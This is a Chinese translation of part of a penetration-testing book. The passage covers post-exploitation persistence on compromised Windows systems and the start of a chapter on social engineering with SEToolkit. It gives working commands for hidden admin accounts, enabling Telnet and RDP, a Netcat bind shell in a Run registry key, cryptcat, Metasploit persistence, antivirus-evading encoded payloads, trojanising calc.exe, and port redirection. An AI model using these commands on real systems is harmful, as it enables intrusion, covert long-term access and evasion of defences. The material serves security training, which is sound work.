# 精通 Kali Linux 高级渗透测试（二）

> 原文：[`annas-archive.org/md5/2DEEA011D658BEAFD40C40F1FA9AC488`](https://annas-archive.org/md5/2DEEA011D658BEAFD40C40F1FA9AC488)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第六章：后期利用 - 持久性

攻击者杀伤链的最后阶段是“命令、控制和通信”阶段，攻击者依赖与被攻击系统的持久连接，以确保他们可以继续保持控制。

为了有效，攻击者必须能够保持**交互式持久性** - 他们必须与被利用的系统保持双向通信渠道（交互式），而不被发现地在被攻击系统上长时间保持（持久性）。这种连接的要求是因为以下原因：

+   网络入侵可能会被检测到，并且被攻击的系统可能会被识别并修补

+   一些漏洞只能利用一次，因为漏洞是间歇性的，利用会导致系统失败，或者因为利用迫使系统改变，使漏洞无法使用

+   攻击者可能需要多次返回同一目标出于各种原因。

+   在目标被攻击时，其有用性并不总是立即知晓

用于保持交互式持久性的工具通常被称为经典术语，如**后门**或**rootkit**。然而，自动恶意软件和人为攻击对长期持久性的趋势已经模糊了传统标签的含义；因此，我们将持久代理指的是旨在长期留在被攻击系统上的恶意软件。

这些持久代理为攻击者和渗透测试人员执行许多功能，包括以下功能：

+   允许上传额外的工具来支持新的攻击，特别是针对位于同一网络上的系统。

+   促进从被攻击系统和网络中窃取数据。

+   允许攻击者重新连接到被攻击的系统，通常通过加密通道以避免被发现。已知持久代理在系统上保留了一年以上。

+   采用反取证技术以避免被发现，包括隐藏在目标的文件系统或系统内存中，使用强身份验证和使用加密。

在本章中，您将了解以下内容：

+   损害现有系统和应用程序文件以进行远程访问

+   创建持久代理

+   使用 Metasploit Framework 保持持久性

+   重定端口以绕过网络控制

# 为了远程访问而损害现有系统和应用程序文件

最佳的持久代理是不需要隐藏的代理，因为它是受损系统现有文件结构的一部分；攻击者只需添加某些功能来将常规系统文件和应用程序转换为持久代理。这种方法几乎永远不会被入侵检测系统等安全控制发现。

## 远程启用 Telnet 服务

用于保持远程访问的一种技术是使用 Metasploit Framework 在 Windows 平台上启用 Telnet 服务，并使用它提供持久性。

第一步是损害目标系统以获得 meterpreter 会话（迁移会话以确保稳定的 shell），然后提升访问特权。

接下来，使用以下命令获取本地命令 shell 以访问目标系统：

```
meterpreter> execute -H -f cmd -i

```

执行此命令时，会创建一个交互式命令 shell（`-i`），作为隐藏进程（`-H`）。

使用 shell 的命令提示符，创建一个新的用户帐户。在创建用户帐户以确保持久性时，许多攻击者使用以下两部分策略：

+   创建一个帐户，如果被调查，会引起注意（例如，Leet7737）

+   创建一个看起来像是正常系统功能的帐户，比如`Service_Account`，使用以下命令：

```
C:\net user Service_Account password /ADD
C:\net localgroup administrators Service_Account /ADD

```

创建新用户帐户后，退出 Windows 命令 shell。

要启用 Telnet，请从`meterpreter`提示符中运行以下命令：

```
run gettelnet -e

```

执行前一个命令的结果如下截图所示：

![远程启用 Telnet 服务](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_01.jpg)

在前一个截图中显示的脚本在受损系统上创建了一个持久的 Telnet 服务。要访问它，请使用 Telnet 协议连接到系统的 IP 地址，并提供用于创建帐户的用户名和密码，如下一个截图所示：

![远程启用 Telnet 服务](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_02.jpg)

Telnet 服务将持续存在，直到被移除。不幸的是，使用 Telnet 存在一些限制：它很容易被发现（特别是因为凭据是明文传输的），并且它只能在命令行模式下运行。

但是，如果您需要 GUI 来访问受损系统上的某些应用程序呢？

## 远程启用 Windows 终端服务

确保远程访问的最可靠技术之一是持久地启用 Windows 终端服务，也称为**远程桌面协议**（**RDP**）。为此，您必须具有管理员特权，并了解目标操作系统的版本。

例如，如果目标是 Windows 7，使用`meterpreter`在目标上获取交互式命令 shell，然后输入以下命令更改注册表：

```
C:\ reg add "hklm\system\currentControlSet\Control\Terminal
  Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
C:\reg add "hklm\system\currentControlSet\Control\Terminal
  Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f 

```

为了确保 RDP 能够通过客户端防火墙，使用以下命令添加规则：

```
C:\ netshadvfirewall firewall set rule group="remote desktop"new enable=Yes

```

现在我们可以使用以下命令启动 RDP 服务：

```
C:\net start Termservice

```

更改启动 RDP 还不是持久的；每次计算机启动时使用以下命令启动 RDP：

```
C:\sc configTermService start= auto

```

启用 RDP 的过程并不太复杂，但应该编写脚本以减少错误的可能性，特别是在处理系统注册表时。幸运的是，`meterpreter`框架使用`GETGUI`脚本自动启用 RDP 服务。

从`meterpreter`提示符运行时，以下屏幕截图中显示的命令行创建了帐户的用户名和密码，隐藏了帐户，使其在登录屏幕上不可见，并对注册表进行了必要的更改以保持持久性。以下屏幕截图显示了用于创建一个看起来像是合法帐户（服务帐户）的用户名的命令，密码很简单。

![远程启用 Windows 终端服务](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_03.jpg)

要连接到受损的远程桌面，请使用 Kali 的**rdesktop**程序。

## 远程启用虚拟网络计算

如果系统包含已知受损的应用程序（特别是远程访问程序），可能可以利用现有的漏洞来利用系统。例如：

+   可能可以从注册表中提取一些程序的远程访问密码。VNC 将密码存储在注册表中，可以通过手动提取注册表键或上传和执行诸如 NirSoft 的 VNCPassView 之类的应用程序来获取这些密码。

+   不同版本的 VNC 包含可以利用的不同漏洞，以便破坏应用程序并远程访问系统。如果用户安装了当前版本，可能可以卸载该版本并安装旧版本。由于各个版本之间功能的相似性，用户可能不会注意到替换，但攻击者可以利用旧版 VNC 中发现的身份验证绕过漏洞在后期保持访问。

Metasploit 具有直接使用 VNC 将 VNC 直接引入受攻击系统的能力，使用 VNCINJECT 模块。

在下面的屏幕截图中，VNC 被选为有效载荷，而不是常规的`reverse_TCP` shell：

![远程启用虚拟网络计算](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_04.jpg)

此攻击不需要任何身份验证。如果您正在测试客户端站点，请确保一旦漏洞已被证明，所有易受攻击的应用程序都已从受损系统中移除 - 否则，您已经创建了一个可以被其他攻击者找到并使用的访问点！

# 使用持久代理

传统上，攻击者会在受损系统上放置后门 - 如果“前门”为合法用户提供授权访问，后门应用程序允许攻击者返回到受攻击的系统并访问服务和数据。

不幸的是，传统的后门提供了有限的交互性，并且并不是设计为在受损系统上持久存在很长时间。这被攻击者社区视为一个重大缺点，因为一旦发现并移除了后门，就需要额外的工作来重复妥协步骤并利用系统，而被警告的系统管理员在防御网络及其资源方面更加困难。

Kali 现在专注于持久代理，如果正确使用，将更难以检测。我们将首先审查的工具是备受尊敬的 Netcat。

## 将 Netcat 作为持久代理

Netcat 是一个支持使用“原始”TCP 和 UDP 数据包从和向网络连接读写的应用程序。与 Telnet 或 FTP 等服务组织的数据包不同，Netcat 的数据包不附带特定于服务的头部或其他通道信息。这简化了通信，并允许几乎通用的通信通道。

Netcat 的最后一个稳定版本是由 Hobbit 于 1996 年发布的，它一直像以往一样有用；事实上，它经常被称为**TCP/IP 瑞士军刀**。Netcat 可以执行许多功能，包括以下内容：

+   端口扫描

+   横幅抓取以识别服务

+   端口重定向和代理

+   文件传输和聊天，包括对数据取证和远程备份的支持

+   用作后门或交互式持久代理，在受损系统上

此时，我们将专注于使用 Netcat 在受损系统上创建持久 shell。尽管以下示例使用 Windows 作为目标平台，但在基于 Unix 的平台上使用时功能相同。

在下面的截图中显示的示例中，我们将保留可执行文件的名称—`nc.exe`；但是，通常在使用之前将其重命名以最小化检测。即使它被重命名，通常也会被杀毒软件识别；许多攻击者会修改或删除 Netcat 源代码中不需要的部分，并在使用之前重新编译它；这些更改可以改变杀毒软件用于识别应用程序为 Netcat 的特定签名，使其对杀毒软件不可见。

Netcat 存储在 Kali 的`/usr/share/windows-binaries`存储库中。要将其上传到受损系统，请在`meterpreter`中输入以下命令：

```
meterpreter> upload/usr/share/windows-binaries/nc.exe
C:\\WINDOWS\\system32 

```

前一个命令的执行结果显示在以下截图中：

![将 Netcat 作为持久代理](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_05.jpg)

您不必将其专门放在`system32`文件夹中；但是，由于此文件夹中的文件类型数量和多样性，这是在受损系统中隐藏文件的最佳位置。

### 提示

在对一个客户进行渗透测试时，我们在一个服务器上发现了六个独立的 Netcat 实例。Netcat 被两个不同的系统管理员安装了两次，以支持网络管理；其他四个实例是由外部攻击者安装的，在渗透测试之前没有被发现。因此，始终查看目标系统上是否已安装了 Netcat！

如果您没有`meterpreter`连接，可以使用**Trivial File Transfer Protocol**（**TFTP**）来传输文件。

接下来，配置注册表以在系统启动时启动 Netcat，并确保它在 444 端口上监听（或者您选择的任何其他端口，只要它没有被使用），使用以下命令：

```
meterpreter>reg setval -k
  HKLM\\software\\microsoft\\windows\\currentversion\\run -vv nc
  -d 'C:\\windows\\system32\\nc.exe -Ldp 444 -e cmd.exe' 

```

使用以下`queryval`命令确认注册表中的更改已成功实施：

```
meterpreter>reg queryval -k
  HKLM\\software\\microsoft\\windows\\currentverion\\run -vv nc 

```

使用`netsh`命令，在本地防火墙上打开一个端口，以确保受损系统将接受对 Netcat 的远程连接。了解目标操作系统是很重要的。`netsh advfirewall firewall`命令行上下文用于 Windows Vista 和 Windows Server 2008 及更高版本；`netsh firewall`命令用于早期操作系统。

要向本地 Windows 防火墙添加端口，请在`meterpreter`提示符处输入`shell`命令，然后使用适当的命令输入`rule`。在命名`rule`时，使用一个像`svchostpassthrough`这样的名称，表明`rule`对系统的正常运行很重要。示例命令如下所示：

```
C:\Windows\system32>netsh firewall add portopening TCP 444
  "service passthrough" 

```

使用以下命令确认更改已成功实施：

```
C:\windows\system32>netsh firewall show portopening

```

前面提到的命令的执行结果显示在以下截图中：

![将 Netcat 作为持久代理](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_06.jpg)

确认端口规则后，确保重启选项有效。

+   从`meterpreter`提示符输入以下命令：

```
meterpreter> reboot

```

+   从交互式 Windows shell 中输入以下命令：

```
C:\windows\system32>shutdown –r –t 00

```

要远程访问受损系统，请在命令提示符中输入`nc`，指示连接的详细程度（`-v`报告基本信息，`-vv`报告更多信息），然后输入目标的 IP 地址和端口号，如下截图所示：

![将 Netcat 作为持久代理](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_07.jpg)

不幸的是，使用 Netcat 存在一些限制—没有传输数据的身份验证或加密，并且几乎所有杀毒软件都会检测到它。

可以使用**cryptcat**解决加密问题，它是 Netcat 的变体，使用 Twofish 加密来保护被攻击主机和攻击者之间传输的数据。由 Bruce Schneier 开发的 Twofish 加密是一种先进的对称分组密码，为加密数据提供了相当强的保护。

要使用`cryptcat`，确保有一个准备好并配置了强密码的监听器，使用以下命令：

```
root@kali:~# cryptcat –k password –l –p 444

```

接下来，上传`cryptcat`到被攻击系统，并使用以下命令配置它连接到监听器的 IP 地址：

```
C:\cryptcat –k password <listener IP address> 444

```

不幸的是，Netcat 及其变体仍然可以被大多数杀毒软件检测到。可以使用十六进制编辑器修改 Netcat 的源代码使其不可检测；这将有助于避免触发杀毒软件的签名匹配动作，但这可能是一个漫长的反复试验过程。更有效的方法是利用 Metasploit Framework 的持久性机制。

# 使用 Metasploit Framework 保持持久性

Metasploit 的`meterpreter`包含几个支持在被攻击系统上保持持久性的脚本。我们将研究两个脚本选项，用于在被攻击系统上放置后门：`metsvc`和`persistence`。

## 使用 metsvc 脚本

`metsvc`脚本是`meterpreter`的网络服务包装器，允许它被用作 Windows 服务或作为命令行应用程序运行。它通常被用作后门，以维持与被攻击系统的通信。

要使用`metsvc`，首先要攻击系统，然后将`meterpreter`迁移到`explorer.exe`进程，以获得更稳定的 shell。

通过调用`run`命令执行`metsvc`代理，如下截图所示。可以看到，它创建了一个临时安装目录，上传了三个文件（`metsrv.dll`，`metsvc-server.exe`和`metsvc.exe`），然后启动了`metsvc`。

![使用 metsvc 脚本](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_08.jpg)

要与持久的`metsvc`代理进行交互，攻击者打开 Metasploit Framework，并选择`use exploit/multi/handler`，载荷为`windows/metsvc_bind_tcp`，如下截图所示。还设置了其他参数（IP 地址和端口）。

![使用 metsvc 脚本](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_09.jpg)

当执行`exploit`命令时，会直接在两个系统之间打开一个会话，允许从`meterpreter`命令行执行权限提升和其他功能。执行`exploit`命令如下截图所示：

![使用 metsvc 脚本](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_10.jpg)

`metsvc`脚本不需要身份验证；一旦代理就位，任何人都可以使用它来访问被攻击系统。大多数攻击者不会在不修改源代码以要求身份验证或确保有某种方法来过滤远程连接的情况下使用它。

更重要的是，这不是一个隐秘的攻击。任何尝试列出运行中的进程，比如从`meterpreter`提示输入`ps`命令，都会识别出`metsvc`服务以及可疑地从`Temp`目录运行的可执行文件！在下面的截图中，位于 Temp 文件夹中的具有随机名称（CvjrsZWOMK）的目录明显标志着系统已被攻击：

![使用 metsvc 脚本](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_11.jpg)

简单检查`Temp`文件夹将识别出三个敌对文件，如下截图所示；然而，这些通常会在手动检查之前被杀毒软件标记。

![使用 metsvc 脚本](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_12.jpg)

## 使用持久性脚本

获得持久性的更有效方法是使用`meterpreter`提示的`persistence`脚本。

在系统被利用并且迁移命令已将初始 shell 移动到更安全的服务之后，攻击者可以从`meterpreter`提示符中调用`persistence`脚本。

在命令中使用`-h`将识别创建持久后门的可用选项，如下面的屏幕截图所示：

![使用持久性脚本](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_13.jpg)

在下面的屏幕截图中的示例中，我们已经配置`persistence`在系统启动时自动运行，并尝试每 10 秒连接到我们的监听器。监听器被标识为远程系统（`-r`）具有特定的 IP 地址和端口。此外，我们可以选择使用`-U`选项，它将在用户登录到系统时启动持久性。

![使用持久性脚本](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_14.jpg)

### 注意

请注意，我们已经任意选择了端口 444 供持久性使用；攻击者必须验证本地防火墙设置，以确保该端口是开放的，或者使用`reg`命令打开该端口。与大多数 Metasploit 模块一样，只要端口尚未被使用，就可以选择任何端口。

`persistence`脚本将 VBS 文件放在临时目录中；但是，您可以使用`-L`选项指定不同的位置。该脚本还将该文件添加到注册表的本地自动运行部分。

因为`persistence`脚本没有经过身份验证，任何人都可以使用它来访问受损系统，因此应在发现或完成渗透测试后尽快从系统中删除。要删除脚本，请确认清理资源文件的位置，然后执行以下`resource`命令：

```
meterpreter> run multi_console_command -rc
  /root/.msf4/logs/persistence/RWBEGGS-
  1E69067_20130920.0024/RWBEGGS-1E69067_20130920.0024.rc 

```

# 使用 Metasploit 创建独立的持久代理

Metasploit 框架可用于创建一个独立的可执行文件，可以在受损系统上持久存在并允许交互式通信。独立包的优势在于可以提前准备和测试以确保连接，并进行编码以绕过本地防病毒软件。

要创建一个简单的独立代理，请在 Kali 的命令提示符上启动`msfconsole`。

使用`msfpayload`来制作持久代理。在下面的屏幕截图中的示例中，代理被配置为使用`reverse_tcp` shell，将连接到端口`4444`上的本地主机`192.168.43.130`。名为`attack1.exe`的代理将使用 win32 可执行文件模板。

![使用 Metasploit 创建独立的持久代理](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_15.jpg)

独立代理只能在未安装防病毒软件的受损系统上运行，或者如果使用适当的`meterpreter`命令先禁用了防病毒软件。要绕过防病毒软件，必须对后门进行编码。

有几种不同的选项可以对有效载荷进行编码，如下面的屏幕截图所示：

![使用 Metasploit 创建独立的持久代理](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_06_16.jpg)

要查看可用选项，请使用`show encoders`命令。

Metasploit 使用大约 30 种不同的编码器；默认情况下，如果未指定编码器，它将选择最合适的编码器。

一个很好的通用编码器是`shikata_ga_nai`。该编码器实现了多态 XOR 加反馈编码，针对 4 字节密钥，是 Metasploit 唯一被评为“优秀”的编码器。

要对先前准备的`attack.exe`代理进行编码，我们使用以下命令：

```
msf>msfencode -i attack.exe -o encoded_attack.exe -e
  x86/shikata_ga_nai -c 5 -t exe 

```

这使用`shikata_ga_nai`协议对`attack.exe`代理进行了五次编码。每次重新编码，它都变得更难检测。但是，可执行文件的大小也会增加。

完整的有效载荷可以直接从 Kali 的命令行中创建。不仅可以对其进行编码，还可以配置编码模式以避免特定字符。例如，在编码持久代理时应避免以下字符，因为它们可能导致攻击被发现和失败：

+   `\x00`代表 0 字节地址

+   `\xa0` 代表换行

+   `\xad` 代表回车

要创建多重编码的有效负载，请使用以下命令：

```
msf>msfpayload windows/meterpreter/bind_tcp
  LPORT=444 R| msfencode -e x86/shikata_ga_nai -c 5 -t raw -a
  x86 -b '\x00\x0a\x0d' -c 5 -x /root/Desktop/attack.exe -o
  /root/Desktop/encoded_attack.exe 

```

您还可以将`msfpayload`编码为现有的可执行文件，修改后的可执行文件和持久代理都将起作用。要将持久代理绑定到一个可执行文件（如计算器（`calc.exe`）），首先将适当的`calc.exe`文件复制到 Metasploit 的模板文件夹中，位于`/usr/share/metasploit-framework/data/templates`。当模板就位时，使用以下命令：

```
msf>msfpayload windows/meterpreter/bind_tcp
  LPORT=444 R| msfencode -t exe -* calc.exe -k -o
  encoded_calc_attack.exe -e x86/shikata_ga_nai -c 5 

```

代理可以放置在目标系统上，重命名为`calc.exe`以替换原始的计算器，然后执行。

不幸的是，几乎所有 Metasploit 编码的可执行文件都可以被客户端防病毒软件检测到。这归因于渗透测试人员向 VirusTotal（[www.virustotal.com](http://www.virustotal.com)）等网站提交了加密的有效负载。然而，您可以创建一个可执行文件，然后使用 Veil-Evasion 对其进行加密，如第四章 *利用*中所述。

# 重定向端口以绕过网络控制

到目前为止，我们已经检查了对受攻击系统的远程控制访问，就好像我们在受害者和攻击者的机器之间有直接连接；然而，这种连接通常受到网络设备（如防火墙）的控制或阻止。

攻击者可以通过端口重定向来规避这些控制，这是一个指定的系统，它监听定义的端口并将原始数据包转发到特定的次要位置。

Kali 提供了几个支持端口重定向的工具，包括`nc`、`cryptcat`、`socat`、`ssh`、`fpipe`和 Metasploit 的`meterpreter`；我们将在以下部分中看一些示例。

## 示例 1 - 简单的端口重定向

简单的端口重定向可能会被使用，例如，如果您已经在网络外部的**非军事区**（**DMZ**）上损坏了一个系统，并且需要能够从远程位置与内部系统进行通信。

在 DMZ 中受损的系统上，配置一个 Netcat 实例来监听传入命令并将其转发到目标，使用以下命令：

```
root@kali:~# nc -l -p 44444 -e <TAGET IP> 444

```

这个命令将调用 Netcat（`nc`）来监听（`-l`）传入的流量，并执行（`-e`）将这些传入的流量传输到端口`444`上的目标。端口不是固定的，它们不必在监听/转发主机和最终目标上相同。

如果您缺乏有关目标内部网络的完整信息，可以尝试以下命令：

```
root@kali:~# nc -l -p <local listening port> -c "nc <TARGET IP> 
  <TARGET port> 

```

这个命令将设置本地（攻击者）Netcat 实例监听（`-l`）指定的端口，然后指示 Netcat 在每次新连接（`-c`）时创建一个新进程。

这个简单的例子允许外部人员连接到直接网络；然而，它不允许双向数据连接，这对于一些工具是必需的。

## 示例 2 - 双向端口重定向

考虑三个独立的 Windows 数据系统：

[攻击者] | [转发者] | [目标]

为了使用 Netcat 创建双向通信通道，我们将不得不使用命名管道。命名管道，也称为 FIFO，是一种创建定义的进程间通信的方法；这使我们可以将其处理为一个对象，在发出命令时更容易管理。在以下示例攻击中，我们创建一个名为`reverse`的命名管道来处理双向通信。

攻击者在他的本地系统上有一个 Netcat 实例，使用以下命令监听端口`6661`：

```
nc -l 6661

```

转发者，一个安装了 Netcat 实例的受损主机，将监听传入的数据包并将其转发到目标；它被配置为使用以下命令在端口`6666`上监听：

```
nc -l 6666

```

在目标系统上，输入以下命令来创建命名管道：

```
mkfifo reverse

```

然后，配置本地的 Netcat 实例，使用命名管道建立跨转发系统与攻击者之间的双向通信，命令如下：

```
nc localhost 6661 0<reverse | nc localhost 6666 1>reverse

```

使用`socat`也可以实现相同的双向数据流，该工具旨在实现这种类型的连接。此示例的命令将从目标系统执行，并使用：

```
socat tcp:localhost:6661 tcp:localhost:6646

```

# 总结

在本章中，我们关注了攻击者杀伤链的最后阶段——命令、控制和通信阶段——在这个阶段，攻击者使用持久代理与被攻击系统进行通信。

这就结束了本书的第一部分，我们在其中详细研究了攻击者的杀伤链，以了解如何将其应用于对网络或孤立系统的妥协。

在第二部分中，*交付阶段*，我们将研究使用各种利用路径的杀伤链的具体应用。在第七章中，*物理攻击和社会工程*，我们将重点关注物理安全和社会工程攻击。主题将包括攻击方法论概述，制作恶意 USB 设备和流氓微型计算机，社会工程工具包，以及测试系统对钓鱼攻击的抵抗力。


# 第二部分：交付阶段

*物理攻击和社会工程*

*利用无线通信*

*对基于 Web 的应用程序进行侦察和利用*

*利用远程访问通信*

*客户端利用*

*安装 Kali Linux*



# 第七章：物理攻击和社会工程

社会工程，特别是与对目标系统的物理访问相结合时，是用于渗透测试或实际攻击的最成功的攻击向量。

作为支持杀链的攻击路径，社会工程侧重于攻击的非技术方面，利用人们的信任和天生的乐于助人来欺骗和操纵他们，使其妥协网络及其资源。

社会工程攻击的成功依赖于两个关键因素：

+   在侦察阶段获得的知识。攻击者必须了解与目标相关的名称和用户名；更重要的是，攻击者必须了解网络用户的关注点。

+   了解如何应用这些知识来说服潜在目标通过点击链接或执行程序来激活攻击。例如，如果目标公司刚刚与以前的竞争对手合并，员工的工作安全可能是最关注的问题。因此，与该主题相关的电子邮件或文件很可能会被目标个人打开。

Kali Linux 提供了几种工具和框架，如果以社会工程为借口影响受害者打开文件或执行某些操作，成功的几率会增加。例如脚本攻击（包括 Visual Basic、WMI 和 PowerShell 脚本）、由 Metasploit Framework 创建的可执行文件，以及**BeEF**（**浏览器利用框架**）。

在本章中，我们将专注于社会工程工具包或 SEToolkit。使用这些工具的技术将作为使用社会工程从其他工具部署攻击的模型。

在本章结束时，您将学会如何使用 SEToolkit 执行以下操作：

+   使用鱼叉式网络钓鱼和 Java 小程序攻击获取远程 shell

+   使用凭证收割者攻击收集用户名和密码

+   启动 tabnabbing 和 webjacking 攻击

+   使用多攻击网络方法

+   使用 PowerShell 的字母数字 shellcode 注入攻击

为支持 SET 的社会工程攻击，将描述以下一般实施做法：

+   隐藏恶意可执行文件和混淆攻击者的 URL

+   通过 DNS 重定向升级攻击

您还将学习如何创建和实施基于 Raspberry PI 微型计算机的敌对物理设备。

# 社会工程工具包

Social-Engineer Toolkit（SEToolkit）是由 David Kennedy（ReL1K）创建和编写的，并由一群活跃的合作者维护（[www.social-engineer.org](http://www.social-engineer.org)）。它是一个开源的 Python 驱动框架，专门设计用于促进社会工程攻击。

SEToolkit 的一个重要优势是它与 Metasploit Framework 的互连性，提供了所需的利用载荷、用于绕过防病毒的加密，以及当被攻击系统向攻击者发送 shell 时连接到受损系统的监听器模块。

在启动 SEToolkit 之前，您可能希望对配置文件进行一些修改。

社会工程工具包预先配置了常见的默认设置；但是，这些设置可以被修改以适应特定的攻击场景。在 Kali 中，配置文件是`/usr/share/set/config/set_config`。修改此文件允许您控制以下内容：

+   Metasploit 变量，包括位置、要使用的数据库、有效负载应该被编码的次数以及一旦建立了 meterpreter 会话后自动运行的命令。

+   **Ettercap**和**dsniff**开关用于促进 DNS 重定向攻击和捕获认证凭据。通过控制 DNS，攻击者可以自动将一群人引导到使用`setoolkit`创建的虚假网站。

+   配置`sendmail`或其他邮件程序以在需要伪造电子邮件地址的攻击中使用；这允许社会工程师通过使用看似来自可信来源的电子邮件地址（例如同一公司的高级经理）来增强攻击的可信度。

+   要使用的电子邮件提供程序，包括 Gmail、Hotmail 和 Yahoo。

+   使用伪造的发布者创建自签名的 Java 小程序，激活 SSL 证书，并窃取数字签名。

+   其他变量，如 IP 地址、端口分配和编码参数。

要在 Kali 发行版中打开社会工程工具包（SET），请转到**应用程序** | **Kali Linux** | **利用工具** | **社会工程工具包** | **setoolkit**，或在 shell 提示符下输入`setoolkit`。将显示主菜单，如下截图所示：

![社会工程工具包](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_01.jpg)

如果选择“1）社会工程攻击”，将显示以下子菜单：

![社会工程工具包](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_02.jpg)

以下是对社会工程攻击的简要解释：

+   `鱼叉式网络钓鱼攻击向量`允许攻击者创建电子邮件消息并将其发送给有附加攻击的目标受害者。

+   `网站攻击向量`利用多种基于 Web 的攻击，包括以下内容：

+   `Java 小程序攻击方法`伪造 Java 证书并传递基于 Metasploit 的有效负载。这是最成功的攻击之一，对 Windows、Linux 或 OSX 目标有效。

+   `Metasploit 浏览器利用方法`使用 iFrame 攻击传递 Metasploit 有效负载。

+   `凭证收割者攻击方法`克隆一个网站并自动重写 POST 参数，以允许攻击者拦截和收割用户凭证；然后在收割完成后将受害者重定向回原始网站。

+   `Tabnabbing 攻击方法`用克隆页面替换非活动浏览器选项卡上的信息，该页面链接回攻击者。当受害者登录时，凭证将发送给攻击者。

+   `网络劫持攻击方法`利用 iFrame 替换使突出显示的 URL 链接看起来合法；但是，当它被点击时，会弹出一个窗口，然后被恶意链接替换。

+   `多攻击 Web 方法`允许攻击者选择一次性发动的几种攻击，包括`Java 小程序攻击方法`、`Metasploit 浏览器利用方法`、`凭证收割者攻击方法`、`Tabnabbing 攻击方法`和`中间人攻击方法`。

+   `传染性媒体生成器`创建一个`autorun.inf`文件和 Metasploit 有效负载。一旦刻录或复制到 USB 设备或物理媒体（CD 或 DVD）并插入目标系统，它将触发自动运行（如果自动运行已启用）并 compromise 系统。

+   `创建有效负载和监听器`模块是一种快速的菜单驱动方法，用于创建 Metasploit 有效负载。攻击者必须使用单独的社会工程攻击来说服目标启动它。

+   `MassMailer 攻击`允许攻击者向单个电子邮件地址或收件人列表发送多个定制的电子邮件。

+   `基于 Arduino 的攻击向量`程序化 Arduino 设备，如 Teensy。因为这些设备在连接到物理 Windows 系统时注册为 USB 键盘，它们可以绕过基于禁用自动运行或其他端点保护的安全性。

+   `短信欺骗攻击向量`允许攻击者向某人的移动设备发送精心制作的短信服务文本，并伪装消息的来源。

+   `无线接入点攻击向量`将在攻击者系统上创建一个虚假的无线接入点和 DHCP 服务器，并将所有 DNS 查询重定向到攻击者。攻击者随后可以发动各种攻击，如 Java 小程序攻击或凭证窃取攻击。

+   `QR 码生成器攻击向量`创建一个与攻击相关的定义 URL 的 QR 码。

+   `Powershell 攻击向量`允许攻击者创建依赖于 PowerShell 的攻击，PowerShell 是一种命令行 shell 和脚本语言，适用于所有 Windows Vista 及更高版本。

+   `第三方模块`允许攻击者使用**远程管理工具 Tommy Edition**（**RATTE**），作为 Java 小程序攻击的一部分或作为独立有效载荷。RATTE 是一个文本菜单驱动的远程访问工具。

SEToolkit 还提供了`快速跟踪渗透测试`的菜单项，该菜单项可以快速访问一些支持 SQL 数据库的暴力识别和密码破解的专门工具，以及一些基于 Python、SCCM 攻击向量、戴尔计算机 DRAC/机箱利用、用户枚举和 PSEXEC PowerShell 注入的定制利用。

菜单还提供了更新 Metasploit Framework、SEToolkit 和 SEToolkit 配置的选项。但是，应避免使用这些附加选项，因为它们在 Kali 上得到的支持不完整，并且可能会导致依赖冲突。

作为 SEToolkit 优势的一个初始示例，我们将看到如何使用它来获得远程 shell——从受损系统到攻击者系统的连接。

## 网络钓鱼攻击

网络钓鱼是针对大量受害者进行的电子邮件欺诈攻击，比如已知的美国互联网用户名单。目标通常没有联系，电子邮件也不试图吸引任何特定个人。相反，它包含一个普遍感兴趣的项目（例如，“点击这里购买便宜的药物”）和一个恶意链接或附件。攻击者打赌至少有一些人会点击链接或附件来发起攻击。

另一方面，钓鱼攻击是一种高度特定的网络钓鱼攻击形式——通过以特定方式制作电子邮件消息，攻击者希望吸引特定受众的注意。例如，如果攻击者知道销售部门使用特定应用程序来管理其客户关系，他可能伪装成应用程序供应商发送一封电子邮件，主题是“<应用程序>的紧急修复-点击链接下载”。

### 提示

网络钓鱼攻击的成功率通常低于 5%；然而，网络钓鱼攻击的成功率范围为 40%至 80%。这就是为什么侦察阶段的信息对于这种类型的攻击的成功至关重要。

平均而言，只需要向目标发送十到十五封电子邮件，就至少会有一封被点击。

在发动攻击之前，请确保 Kali 上安装了`sendmail`（`apt-get install sendmail`）并将`set_config`文件从`SENDMAIL=OFF`更改为`SENDMAIL=ON`。

要发动攻击，请从主 SEToolkit 菜单中选择`社会工程攻击`，然后从子菜单中选择`网络钓鱼攻击向量`。这将启动攻击的开始选项，如下截图所示：

![网络钓鱼攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_03.jpg)

选择`1`执行大规模电子邮件攻击；然后将显示攻击有效负载列表，如下截图所示：

